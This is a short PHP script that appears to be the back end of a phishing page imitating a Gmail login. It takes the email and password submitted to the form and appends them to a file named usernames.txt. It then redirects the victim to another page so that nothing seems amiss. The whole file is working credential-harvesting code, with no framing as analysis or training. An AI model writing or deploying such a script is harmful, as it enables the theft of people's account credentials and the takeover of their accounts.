<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: result.html.php');
exit();
?>